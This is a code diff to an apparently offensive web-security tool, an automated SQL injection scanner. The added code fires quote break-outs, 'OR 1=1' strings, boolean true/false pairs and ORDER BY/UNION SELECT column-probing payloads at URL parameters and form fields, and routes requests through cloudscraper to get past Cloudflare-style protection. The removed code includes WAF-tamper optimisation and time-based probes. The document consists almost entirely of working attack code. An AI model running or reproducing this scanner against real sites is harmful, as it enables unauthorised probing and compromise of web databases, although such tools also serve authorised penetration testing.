@@ -20,13 +20,25 @@ from sqli_hunter.bayesian_tamper_optimizer import BayesianTamperOptimizer, TAMPE
 from sqli_hunter.db_fingerprinter import BEHAVIORAL_PROBES
 from typing import Callable, Awaitable, Any, Tuple, List, Set, Dict
 from collections import defaultdict
+from rich.console import Console
+from rich.panel import Panel
 
 WAF_TEMPO_MAP = { "Cloudflare": 1.5, "AWS WAF": 0.5, "Imperva (Incapsula)": 1.0 }
 MAX_BACKOFF_DELAY = 60.0
+ANOMALY_CONFIRMATION_THRESHOLD = 0.8 # Score needed to trigger secondary analysis
 
 class Scanner:
-    def __init__(self, browser_context: BrowserContext, canary_store: Dict, waf_name: str | None = None, n_calls: int = 20):
+    QUICK_SCAN_PAYLOADS = [
+        "'", '"', "#", ";", "')", "'))", "'))--", "'))-- ",
+        "' OR 1=1--", '" OR 1=1--', "' OR '1'='1", '" OR "1"="1',
+        "' OR 1=1#", "' OR 1=1-- ", "' OR 'x'='x",
+    ]
+
+    def __init__(self, browser_context: BrowserContext, scraper: cloudscraper.CloudScraper, canary_store: Dict, waf_name: str | None = None, n_calls: int = 20, debug: bool = False):
         self.context = browser_context
+        self.scraper = scraper
+        self.debug = debug
+        self.console = Console()
         self.vulnerable_points = []
         self.lock = asyncio.Lock()
         self.dns_resolver = dns.asyncresolver.Resolver()
@@ -52,19 +64,15 @@ class Scanner:
                 print(f"[*] Rate limit seems to have eased. Reducing backoff delay to {self.rate_limit_delay:.2f}s.")
                 if self.rate_limit_delay == 1.0: self.rate_limit_active = False; print("[*] Rate limiting deactivated.")
 
-    async def _send_headless_request(self, scraper: cloudscraper.CloudScraper, url: str, method: str = "GET", params: dict = None, data: dict = None, json_data: dict = None, timeout: int = 30) -> tuple[str | None, float, bool]:
+    async def _send_headless_request(self, url: str, method: str = "GET", params: dict = None, data: dict = None, json_data: dict = None, timeout: int = 30) -> tuple[str | None, float, bool, int]:
         start_time = time.monotonic()
-
         def sync_request():
             method_upper = method.upper()
-            if method_upper == "GET":
-                return scraper.get(url, params=params, timeout=timeout)
+            if method_upper == "GET": return self.scraper.get(url, params=params, timeout=timeout)
             elif method_upper == "POST":
                 post_body = json_data if json_data is not None else data
-                return scraper.post(url, params=params, data=post_body, json=json_data, timeout=timeout)
-            else:
-                raise NotImplementedError(f"Method {method_upper} not implemented")
-
+                return self.scraper.post(url, params=params, data=post_body, json=json_data, timeout=timeout)
+            else: raise NotImplementedError(f"Method {method_upper} not implemented")
         try:
             response = await asyncio.to_thread(sync_request)
             duration = time.monotonic() - start_time
@@ -72,288 +80,236 @@ class Scanner:
             status = response.status_code
             is_blocked = status in [403, 406] or any(s in body.lower() for s in ["request blocked", "forbidden", "waf"])
             self._update_rate_limit_status(status, is_blocked)
-            return body, duration, is_blocked
+            if self.debug:
+                request_info = f"[bold blue]URL:[/] {url}\n[bold blue]Method:[/] {method.upper()}\n[bold blue]Params:[/] {params}\n[bold blue]Data:[/] {data}\n[bold blue]JSON:[/] {json_data}"
+                response_info = f"[bold blue]Status:[/] {status}\n[bold blue]Duration:[/] {duration:.4f}s\n[bold blue]Body:[/] {body[:500]}..."
+                self.console.print(Panel(request_info, title="[bold cyan]Debug: Headless Request Sent", expand=False))
+                self.console.print(Panel(response_info, title="[bold cyan]Debug: Headless Response Received", expand=False))
+            return body, duration, is_blocked, status
         except Exception as e:
-            # print(f"  [!] cloudscraper request failed: {e}")
-            return None, time.monotonic() - start_time, False
+            if self.debug: self.console.print(Panel(f"Request to {url} failed: {e}", title="[bold red]Debug: Request Exception", expand=False))
+            return None, time.monotonic() - start_time, False, 500
 
-    async def _send_browser_request(self, page: Page, url: str, method: str = "GET", params: dict = None, data: dict = None, json_data: dict = None, timeout: int = 30000) -> tuple[str | None, float, bool]:
-        start_time = time.monotonic()
-        try:
-            method_upper = method.upper()
-            if method_upper == "GET":
-                response = await page.request.get(url, params=params, timeout=timeout)
-            elif method_upper == "POST":
-                post_body = json_data if json_data is not None else data
-                response = await page.request.post(url, params=params, data=post_body, timeout=timeout)
-            else:
-                raise NotImplementedError(f"Method {method} not implemented in _send_browser_request")
-
-            duration = time.monotonic() - start_time
-            body = await response.text()
-            status = response.status
-            is_blocked = status in [403, 406] or any(s in body.lower() for s in ["request blocked", "forbidden", "waf"])
-            self._update_rate_limit_status(status, is_blocked)
-            return body, duration, is_blocked
-        except Error as e:
-            # print(f"  [DEBUG] Playwright error in browser request: {e}")
-            return None, time.monotonic() - start_time, False
-
-    async def _get_baseline(self, page: Page, url: str, method: str, params: dict = None, data: dict = None, json_data: dict = None) -> tuple[float, Simhash | None]:
-        timings, content_for_hash = [], None
+    async def _get_baseline(self, url: str, method: str, params: dict = None, data: dict = None, json_data: dict = None) -> tuple[int, float, Simhash | None, str | None]:
+        """Sends multiple requests to establish a baseline for status, time, and content."""
+        timings, bodies, statuses = [], [], []
         for _ in range(3):
-            content, duration, _ = await self._send_browser_request(page, url, method=method, params=params, data=data, json_data=json_data)
-            timings.append(duration)
-            if content and content_for_hash is None: content_for_hash = content
-        if not timings: return 0.0, None
-        return statistics.median(timings), Simhash(content_for_hash) if content_for_hash else None
+            body, duration, is_blocked, status = await self._send_headless_request(url, method=method, params=params, data=data, json_data=json_data)
+            if body and not is_blocked:
+                timings.append(duration)
+                bodies.append(body)
+                statuses.append(status)
+            await asyncio.sleep(0.5)
+        if not bodies:
+            print("[!] Failed to establish a baseline. All baseline requests failed or were blocked.")
+            return 500, 0.0, None, None
+        baseline_body = bodies[0]
+        baseline_status = statuses[0]
+        baseline_time = statistics.median(timings) if timings else 0
+        return baseline_status, baseline_time, Simhash(baseline_body), baseline_body
+
+    def _analyze_response_for_anomalies(self, baseline_status: int, baseline_hash: Simhash, response_status: int, response_body: str) -> tuple[float, str | None]:
+        """
+        Analyzes a response against a baseline and returns an anomaly score (0.0 to 1.0)
+        and the dialect inferred from an error message, if any.
+        """
+        anomaly_score = 0.0
+        inferred_dialect = None
+        if not response_body or not baseline_hash: return 0.0, None
+        if response_status != baseline_status:
+            anomaly_score += 0.5 if response_status >= 400 else 0.2
+        hash_distance = baseline_hash.distance(Simhash(response_body))
+        normalized_distance = min(hash_distance / 64.0, 1.0)
+        anomaly_score += (normalized_distance * 0.4)
+
+        # Check for classic SQL error patterns and infer dialect
+        # This is a simplified mapping. A more robust solution would use a more detailed map.
+        for pattern in SQL_ERROR_PATTERNS:
+            if re.search(pattern, response_body, re.IGNORECASE):
+                if self.debug: print(f"    [bold yellow]Debug: Found error pattern:[/] {pattern}")
+                anomaly_score += 0.9
+                if "mysql" in pattern: inferred_dialect = "mysql"
+                elif "ora-" in pattern: inferred_dialect = "oracle"
+                elif "postgresql" in pattern: inferred_dialect = "postgresql"
+                elif "sqlsrv" in pattern: inferred_dialect = "mssql"
+                break
+        return min(anomaly_score, 1.0), inferred_dialect
+
+    async def _confirm_boolean_anomaly(self, url, method, create_request_args, context) -> bool:
+        """Sends true/false payloads to confirm a suspected boolean-based vulnerability."""
+        print("    [+] Anomaly detected. Launching secondary confirmation (Boolean)...")
+        true_payload = self._contextualize_string_payload(" AND 1=1", context)
+        false_payload = self._contextualize_string_payload(" AND 1=2", context)
+
+        true_args = await create_request_args(true_payload)
+        true_body, _, _, _ = await self._send_headless_request(url, method, **true_args)
+
+        false_args = await create_request_args(false_payload)
+        false_body, _, _, _ = await self._send_headless_request(url, method, **false_args)
+
+        if true_body and false_body and Simhash(true_body).distance(Simhash(false_body)) > 5:
+            print("    [bold green][+] Confirmed Boolean-Based SQLi![/bold green]")
+            return True
+        return False
+
+    async def _fuzz_parameter_for_anomalies(self, url: str, method: str, param_name: str, original_value: str, create_request_args: Callable, baseline_status: int, baseline_hash: Simhash, baseline_time: float, base_data: dict) -> bool:
+        """Fuzzes a parameter, scores responses for anomalies, and confirms vulnerabilities."""
+        print(f"  [*] Fuzzing for anomalies on param '{param_name}'...")
+        fuzz_string = "sqlihunter"
+        for payload in self.QUICK_SCAN_PAYLOADS:
+            for injected_value in [original_value + payload, fuzz_string + payload, payload]:
+                final_request_args = await create_request_args(injected_value)
+                body, _, is_blocked, status = await self._send_headless_request(url, method, **final_request_args)
+                if is_blocked or not body: continue
+
+                anomaly_score, inferred_dialect = self._analyze_response_for_anomalies(baseline_status, baseline_hash, status, body)
+
+                if anomaly_score >= ANOMALY_CONFIRMATION_THRESHOLD:
+                    if inferred_dialect: # Found a high-confidence error pattern
+                        await self._report_vulnerability(url, "Error-Based SQLi", param_name, injected_value, ("anomaly_scan",), method, final_request_args, inferred_dialect, baseline_time=baseline_time)
+                        return True
+
+                    page = await self.context.new_page()
+                    try:
+                        context = await self._perform_taint_analysis(page, url, method, create_request_args)
+                        if await self._confirm_boolean_anomaly(url, method, create_request_args, context):
+                            await self._report_vulnerability(url, "Boolean-Based SQLi", param_name, injected_value, ("anomaly_confirmation",), method, final_request_args, baseline_time=baseline_time)
+                            return True
+                    finally:
+                        await page.close()
+        return False
+
+    async def _union_based_scan(self, url: str, method: str, param_name: str, original_value: str, create_request_args: Callable, baseline_hash: Simhash) -> bool:
+        """Performs a UNION-based SQLi scan."""
+        print(f"  [*] Starting UNION-based scan for param '{param_name}'...")
+        column_count = -1
+        break_out_chars = ["'", '"', "')"]
+        prefix_used = ""
+        for prefix in break_out_chars:
+            for i in range(1, 26):
+                payload = f"{prefix} AND 1=2 ORDER BY {i}-- "
+                args = await create_request_args(original_value + payload)
+                body, _, is_blocked, _ = await self._send_headless_request(url, method, **args)
+                if is_blocked or not body: continue
+                if baseline_hash and Simhash(body).distance(baseline_hash) > 5:
+                    column_count = i - 1
+                    print(f"    [+] Potential column count found: {column_count} with prefix '{prefix}'")
+                    prefix_used = prefix
+                    break
+            if column_count != -1:
+                break
+        if column_count <= 0:
+            print("    [-] Could not determine column count for UNION scan.")
+            return False
+        marker = "sqlihunter" + uuid.uuid4().hex[:6]
+        nulls = ["NULL"] * column_count
+        for i in range(column_count):
+            union_payload_parts = nulls[:]
+            marker_payload = "CHAR(" + ",".join([str(ord(c)) for c in marker]) + ")"
+            union_payload_parts[i] = marker_payload
+            union_payload = f"{prefix_used} AND 1=2 UNION SELECT {','.join(union_payload_parts)}-- "
+            args = await create_request_args(original_value + union_payload)
+            body, _, is_blocked, _ = await self._send_headless_request(url, method, **args)
+            if is_blocked or not body: continue
+            if marker in body:
+                print(f"    [+] UNION-based SQLi confirmed! Marker found in response.")
+                union_info = {"column_count": column_count, "prefix": prefix_used, "marker_col": i}
+                # We don't know the dialect for sure here, so we pass it as generic
+                await self._report_vulnerability(url, "UNION-based SQLi", param_name, union_payload, ("union_scan",), method, args, "generic", union_info)
+                return True
+        print("    [-] UNION-based scan did not find a vulnerability.")
+        return False
 
     async def _perform_taint_analysis(self, page: Page, url: str, method: str, create_request_args: Callable) -> str:
+        """Performs taint analysis using headless response parsing instead of browser rendering."""
         taint = "sqlihunter" + uuid.uuid4().hex[:8]
-        request_args = await create_request_args(taint)
-        body, _, is_blocked = await self._send_browser_request(page, url, method, **request_args)
-        if is_blocked or not body or taint not in body: return "HTML_TEXT"
-
-        if re.search(f"'[^>]*{taint}[^>]*'", body, re.IGNORECASE): return "HTML_ATTRIBUTE_SINGLE_QUOTED"
-        if re.search(f'"[^>]*{taint}[^>]*"', body, re.IGNORECASE): return "HTML_ATTRIBUTE_DOUBLE_QUOTED"
-        if re.search(f">(?!'|\")[^<]*{taint}[^<]*<", body, re.IGNORECASE): return "HTML_TEXT"
+        args = await create_request_args(taint)
+        body, _, _, _ = await self._send_headless_request(url, method, **args)
+        if not body or taint not in body: return "HTML_TEXT"
+        soup = BeautifulSoup(body, 'html.parser')
+        if soup.find(text=re.compile(taint)): return "HTML_TEXT"
+        if soup.find(attrs={'value': re.compile(taint)}) or soup.find(attrs={'href': re.compile(taint)}): return "HTML_ATTRIBUTE"
+        if soup.find('script', text=re.compile(taint)): return "JS_STRING"
         return "HTML_TEXT"
 
-    def _create_objective_wrapper(self, async_objective_func: Callable) -> Callable:
-        current_loop = asyncio.get_running_loop()
-        def sync_objective_wrapper(tamper_chain: List[str]) -> float:
-            future = asyncio.run_coroutine_threadsafe(async_objective_func(tuple(tamper_chain)), current_loop)
-            try:
-                return future.result(timeout=60)
-            except (asyncio.TimeoutError, Exception):
-                return 0.0
-        return sync_objective_wrapper
-
-    def _create_error_based_objective(self, scraper: cloudscraper.CloudScraper, url: str, method: str, context: str, original_value: str, create_request_args: Callable) -> Callable:
-        async def async_objective(tamper_chain: Tuple[str, ...]) -> float:
-            payload, _ = self.payload_generator.generate("ERROR_BASED", context)[0]
-            tampered_payload = apply_tampers(payload, list(tamper_chain))
-            args = await create_request_args(tampered_payload)
-            body, _, is_blocked = await self._send_headless_request(scraper, url, method, **args)
-            if is_blocked: return 1.0
-            if body and any(re.search(p, body, re.IGNORECASE) for p in SQL_ERROR_PATTERNS):
-                return -1.0
-            return 0.0
-        return self._create_objective_wrapper(async_objective)
-
-    def _create_boolean_based_objective(self, scraper: cloudscraper.CloudScraper, url: str, method: str, context: str, original_value: str, create_request_args: Callable, baseline_hash: Simhash) -> Callable:
-        async def async_objective(tamper_chain: Tuple[str, ...]) -> float:
-            true_payload, false_payload, _ = self.payload_generator.generate("BOOLEAN_BASED", context)[0]
-
-            tampered_true = apply_tampers(true_payload, list(tamper_chain))
-            true_args = await create_request_args(tampered_true)
-            true_body, _, is_blocked_true = await self._send_headless_request(scraper, url, method, **true_args)
-            if is_blocked_true: return 1.0
-
-            tampered_false = apply_tampers(false_payload, list(tamper_chain))
-            false_args = await create_request_args(tampered_false)
-            false_body, _, is_blocked_false = await self._send_headless_request(scraper, url, method, **false_args)
-            if is_blocked_false: return 1.0
-
-            if true_body and false_body and baseline_hash.distance(Simhash(true_body)) < 3 and Simhash(true_body).distance(Simhash(false_body)) > 3:
-                return -1.0
-            return 0.0
-        return self._create_objective_wrapper(async_objective)
-
-    async def _exhaustive_time_scan(self, scraper: cloudscraper.CloudScraper, url: str, method: str, context: str, original_value: str, create_request_args: Callable, baseline_median: float) -> Tuple[str | None, tuple | None]:
-        """A more exhaustive, systematic scan for time-based vulnerabilities."""
-        print("  [+] Running Exhaustive Time-Based scan...")
-        sleep_time = 5
-        # We get the first payload generated, assuming it's a good generic one.
-        payload, _ = self.payload_generator.generate("TIME_BASED", context, options={"sleep_time": sleep_time})[0]
-
-        # A set of tamper chains to test, starting with the most basic.
-        tampers_to_test = [('none',)] + \
-                          [(t,) for t in TAMPER_CATEGORIES if t != 'none'] + \
-                          list(itertools.combinations([t for t in TAMPER_CATEGORIES if t != 'none'], 2))
-
-        for chain in tampers_to_test:
-            tampered_payload = apply_tampers(payload, list(chain))
-            args = await create_request_args(tampered_payload)
-            _, duration, is_blocked = await self._send_headless_request(scraper, url, method, **args)
-
-            if not is_blocked and duration is not None and duration > baseline_median + (sleep_time * 0.8):
-                return payload, chain
-
-        return None, None
-
-
-    async def _fingerprint_parameter(self, scraper: cloudscraper.CloudScraper, page: Page, url: str, method: str, create_request_args: Callable, original_value: str) -> str | None:
-        """
-        Sends behavioral probes to the target parameter and analyzes the responses to
-        determine the most likely database engine.
-        """
-        print(f"[*] Starting smart database fingerprinting for parameter...")
-        db_scores = defaultdict(int)
-
-        # Get a baseline response using a non-malicious value
-        baseline_args = await create_request_args(original_value)
-        baseline_body, baseline_duration, _ = await self._send_headless_request(scraper, url, method, **baseline_args)
-        if baseline_body is None:
-             # Fallback to browser request if headless fails for baseline
-             baseline_body, baseline_duration, _ = await self._send_browser_request(page, url, method, **baseline_args)
-
-        # If we can't even get a valid (non-empty) baseline, we can't fingerprint.
-        if not baseline_body:
-            print("[!] Could not retrieve a valid (non-empty) baseline response for fingerprinting. Aborting.")
-            return None
-
-        baseline_hash = Simhash(baseline_body)
-
-        for probe in BEHAVIORAL_PROBES:
-            # The payloads are crafted to be injected into a string context
-            args = await create_request_args(original_value + probe['payload'])
-            body, duration, is_blocked = await self._send_headless_request(scraper, url, method, **args, timeout=10)
-
-            if is_blocked: continue
-
-            was_successful = False
-            if body is not None and probe['type'] == 'time':
-                if duration > baseline_duration + (probe['validator'] * 0.7):
-                    was_successful = True
-            elif body is not None and probe['type'] == 'content':
-                if probe['validator'] and probe['validator'] in body:
-                    was_successful = True
-                elif probe['validator'] is None and body is not None:
-                     if Simhash(body).distance(baseline_hash) < 10:
-                          was_successful = True
-            elif body is not None and probe['type'] == 'error':
-                 if re.search(probe['validator'], body):
-                     was_successful = True
-
-            if was_successful:
-                db_scores[probe['db']] += 1
-                print(f"  [+] Hit for {probe['db']} (Type: {probe['type']})")
-
-        if not db_scores:
-            print("[-] Smart fingerprinting did not identify a database for this parameter.")
-            return None
-
-        most_likely_db = max(db_scores, key=db_scores.get)
-        print(f"[*] Fingerprinting finished. Scores: {dict(db_scores)}")
-        print(f"[+] Most likely database detected: {most_likely_db}")
-        return most_likely_db
-
-    async def _run_scan_for_parameter(self, scraper: cloudscraper.CloudScraper, page: Page, url: str, method: str, param_name: str, original_value: str, baseline_median: float, baseline_hash: Simhash, collaborator_url: str, create_request_args: Callable):
-        total_delay = self.static_request_delay
-        if self.rate_limit_active: total_delay += self.rate_limit_delay
-        if total_delay > 0: await asyncio.sleep(total_delay * random.uniform(0.8, 1.2))
-
-        # Fingerprint the parameter to determine the database type
-        db_type = await self._fingerprint_parameter(scraper, page, url, method, create_request_args, original_value)
-        if not db_type:
-            print(f"  [!] Could not determine database for param '{param_name}', skipping.")
-            return
-
-        # Instantiate the payload generator with the detected dialect
-        self.payload_generator = AstPayloadGenerator(dialect=db_type)
-
-        context = await self._perform_taint_analysis(page, url, method, lambda taint: create_request_args(original_value + taint))
-        print(f"  [*] Taint Analysis for param '{param_name}' found reflection context: {context}")
-
-        # --- Error-Based Scan (Optimizer) ---
-        print(f"  [+] Running Error-Based Optimizer for '{param_name}'...")
-        error_objective = self._create_error_based_objective(scraper, url, method, context, original_value, lambda p: create_request_args(p))
-        error_optimizer = BayesianTamperOptimizer(objective_func=error_objective, n_calls=self.n_calls, n_initial_points=5)
-        best_error_chain, best_error_score = await asyncio.to_thread(error_optimizer.optimize)
-        if best_error_score < 0:
-            payload_used, _ = self.payload_generator.generate("ERROR_BASED", context)[0]
-            await self._report_vulnerability(url, "Error-Based SQLi", param_name, payload_used, best_error_chain)
-            return
-
-        # --- Time-Based Scan (Exhaustive) ---
-        time_payload, time_chain = await self._exhaustive_time_scan(scraper, url, method, context, original_value, lambda p: create_request_args(p), baseline_median)
-        if time_payload:
-            await self._report_vulnerability(url, "Time-Based SQLi", param_name, time_payload, time_chain)
-            return
-
-        # --- Boolean-Based Scan (Optimizer) ---
-        if baseline_hash:
-            print(f"  [+] Running Boolean-Based Optimizer for '{param_name}'...")
-            boolean_objective = self._create_boolean_based_objective(scraper, url, method, context, original_value, lambda p: create_request_args(p), baseline_hash)
-            boolean_optimizer = BayesianTamperOptimizer(objective_func=boolean_objective, n_calls=self.n_calls, n_initial_points=5)
-            best_boolean_chain, best_boolean_score = await asyncio.to_thread(boolean_optimizer.optimize)
-            if best_boolean_score < 0:
-                true_payload, false_payload, _ = self.payload_generator.generate("BOOLEAN_BASED", context)[0]
-                payload_used = f"TRUE: {true_payload}, FALSE: {false_payload}"
-                await self._report_vulnerability(url, "Boolean-Based SQLi", param_name, payload_used, best_boolean_chain)
-                return
-
-        print(f"  [-] No vulnerabilities found for param '{param_name}'.")
-
-    async def _report_vulnerability(self, url, vuln_type, param, payload, chain):
-        vuln_info = {"url": url, "type": vuln_type, "parameter": param, "payload": payload, "tamper_chain": list(chain)}
-        async with self.lock:
-            print(f"[bold red][+] Vulnerability Found: {json.dumps(vuln_info)}[/bold red]")
-            self.vulnerable_points.append(vuln_info)
-
-    async def _scan_url(self, scraper: cloudscraper.CloudScraper, page: Page, url: str, collaborator_url: str | None):
-        parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query)
-        if not query_params: return
-        baseline_median, baseline_hash = await self._get_baseline(page, url, "GET", params=query_params)
-        for param_name, values in query_params.items():
-            async def create_request_args(p_value):
-                return {'params': {**query_params, param_name: p_value}}
-            await self._run_scan_for_parameter(scraper, page, url, "GET", param_name, values[0], baseline_median, baseline_hash, collaborator_url, create_request_args)
-
-    async def _scan_json_endpoint(self, scraper: cloudscraper.CloudScraper, page: Page, url: str, json_body: dict, collaborator_url: str | None):
-        baseline_median, baseline_hash = await self._get_baseline(page, url, "POST", json_data=json_body)
-        for key, value in json_body.items():
-            if not isinstance(value, str): continue
-            async def create_request_args(p_value):
-                return {'json_data': {**json_body, key: p_value}}
-            await self._run_scan_for_parameter(scraper, page, url, "POST", key, value, baseline_median, baseline_hash, collaborator_url, create_request_args)
-
-    async def _get_fresh_csrf_token(self, page: Page, form_page_url: str, csrf_field_name: str) -> str | None:
-        try:
-            await page.goto(form_page_url, wait_until="domcontentloaded"); soup = BeautifulSoup(await page.content(), 'html.parser')
-            token_element = soup.find('input', {'name': csrf_field_name}); return token_element['value'] if token_element else None
-        except Error as e: print(f"[!] Failed to fetch fresh CSRF token from {form_page_url}: {e}"); return None
-
-    async def _scan_form(self, scraper: cloudscraper.CloudScraper, page: Page, form_details: dict, collaborator_url: str | None):
-        url, method, inputs = form_details['url'], form_details['method'].upper(), form_details['inputs']
-        csrf_field_name = form_details.get('csrf_field_name'); form_page_url = url
-        base_data = {inp["name"]: inp.get("value", "") for inp in inputs if inp.get("name")}
-        if csrf_field_name:
-            fresh_token = await self._get_fresh_csrf_token(page, form_page_url, csrf_field_name)
-            if not fresh_token: print(f"[!] Could not get CSRF token for baseline on {url}. Scan may fail."); return
-            base_data[csrf_field_name] = fresh_token
-        baseline_median, baseline_hash = await self._get_baseline(page, url, method, data=base_data)
-        for input_to_test in inputs:
-            param_name = input_to_test.get("name")
-            if not param_name or input_to_test.get("type") not in ["text", "textarea", "password", "email", "search", "url", "tel"] or param_name == csrf_field_name: continue
-            async def create_form_request_args(p_value):
-                return {'data': {**base_data, param_name: p_value}}
-            await self._run_scan_for_parameter(scraper, page, url, method, param_name, input_to_test.get("value", ""), baseline_median, baseline_hash, collaborator_url, create_form_request_args)
+    def _contextualize_string_payload(self, payload: str, context: str) -> str:
+        """Adds context-specific prefixes/suffixes to a raw string payload."""
+        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED", "HTML_ATTRIBUTE"]:
+            sql = "'" + payload + "-- "
+        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
+            sql = '"' + payload + "-- "
+        else:
+            if payload.strip().startswith(';'): sql = "'" + payload + "-- "
+            else: sql = payload + "-- "
+        return sql
 
     async def scan_target(self, target_item: dict, collaborator_url: str | None = None):
-        scraper = cloudscraper.create_scraper()
+        """Main entry point for scanning a single target (URL, form, etc.)."""
+        target_type, url = target_item.get("type"), target_item.get("url")
+        method = target_item.get("method", "GET").upper()
 
-        cookies = await self.context.cookies()
-        for cookie in cookies:
-            scraper.cookies.set(cookie['name'], cookie['value'], domain=cookie['domain'])
+        if target_type == 'form':
+            inputs = target_item.get("inputs", [])
+            base_data = {}
+            for inp in inputs:
+                name = inp.get("name")
+                if not name: continue
+                if inp.get("value"): base_data[name] = inp.get("value")
+                else:
+                    if inp.get("type") == "password": base_data[name] = "123456"
+                    elif inp.get("type") == "email": base_data[name] = "test@test.com"
+                    else: base_data[name] = "test"
 
-        page = await self.context.new_page()
-        try:
-            target_type, url = target_item.get("type"), target_item.get("url")
-            async with self.lock:
-                if any(p['url'] == url and p.get('parameter') for p in self.vulnerable_points):
-                    print(f"[*] Skipping {url} as a vulnerability has already been found in this URL.")
-                    return
+            baseline_status, baseline_time, baseline_hash, baseline_body = await self._get_baseline(url, method, data=base_data)
+            if not baseline_hash: return
 
-            if target_type == 'form': await self._scan_form(scraper, page, target_item, collaborator_url)
-            elif target_type == 'api' or (target_item.get("method", "GET").upper() == "POST" and target_item.get("content_type")):
-                method, content_type = target_item.get("method", "GET").upper(), target_item.get("content_type")
-                if method == "POST" and content_type and 'application/json' in content_type:
-                    post_data = target_item.get("post_data")
-                    json_body = json.loads(post_data) if isinstance(post_data, str) else post_data
-                    await self._scan_json_endpoint(scraper, page, url, json_body, collaborator_url)
-                else: await self._scan_url(scraper, page, url, collaborator_url)
-            elif target_type == 'url': await self._scan_url(scraper, page, url, collaborator_url)
-            else: print(f"[!] Skipping target with unhandled type: {target_type}")
-        finally: await page.close()
+            for input_to_test in inputs:
+                param_name = input_to_test.get("name")
+                if not param_name or input_to_test.get("type") not in ["text", "textarea", "password", "email", "search", "url", "tel"]: continue
+                original_value_for_param = next((i.get("value", "") for i in inputs if i.get("name") == param_name), "")
+                async def create_request_args(p_value):
+                    fuzz_data = base_data.copy()
+                    fuzz_data[param_name] = p_value
+                    return {'data': fuzz_data}
+                is_vuln = await self._fuzz_parameter_for_anomalies(url, method, param_name, original_value_for_param, create_request_args, baseline_status, baseline_hash, baseline_time, base_data)
+                if is_vuln: return # Stop if error/boolean based is found
+
+                # If no other vuln found, try for UNION based
+                is_union_vuln = await self._union_based_scan(url, method, param_name, original_value_for_param, create_request_args, baseline_hash)
+                if is_union_vuln: return
+
+        elif target_type == 'url':
+            parsed_url = urlparse(url)
+            query_params = parse_qs(parsed_url.query)
+            if not query_params: return
+            baseline_status, baseline_time, baseline_hash, baseline_body = await self._get_baseline(url, method, params=query_params)
+            if not baseline_hash: return
+            for param_name, values in query_params.items():
+                async def create_request_args(p_value): return {'params': {**query_params, param_name: p_value}}
+                is_vuln = await self._fuzz_parameter_for_anomalies(url, method, param_name, values[0], create_request_args, baseline_status, baseline_hash, baseline_time, query_params)
+                if is_vuln: return # Stop if error/boolean based is found
+
+                # If no other vuln found, try for UNION based
+                is_union_vuln = await self._union_based_scan(url, method, param_name, values[0], create_request_args, baseline_hash)
+                if is_union_vuln: return
+        else:
+            if self.debug: print(f"[!] Skipping target with unhandled type: {target_type}")
+
+    async def _report_vulnerability(self, url: str, vuln_type: str, param: str, payload: str, chain: tuple, method: str, request_data: dict, dialect: str | None = None, union_info: dict = None, baseline_time: float = 0.0):
+        """Stores vulnerability details, including method, request data, dialect, and union info."""
+        vuln_info = {
+            "url": url,
+            "type": vuln_type,
+            "parameter": param,
+            "payload": payload,
+            "tamper_chain": list(chain),
+            "method": method,
+            "request_data": request_data,
+            "dialect": dialect,
+            "union_info": union_info,
+            "baseline_time": baseline_time
+        }
+        async with self.lock:
+            if not any(v['url'] == url and v['parameter'] == param for v in self.vulnerable_points):
+                self.console.print(Panel(json.dumps(vuln_info, indent=2), title="[bold red]Vulnerability Found!", expand=False))
+                self.vulnerable_points.append(vuln_info)
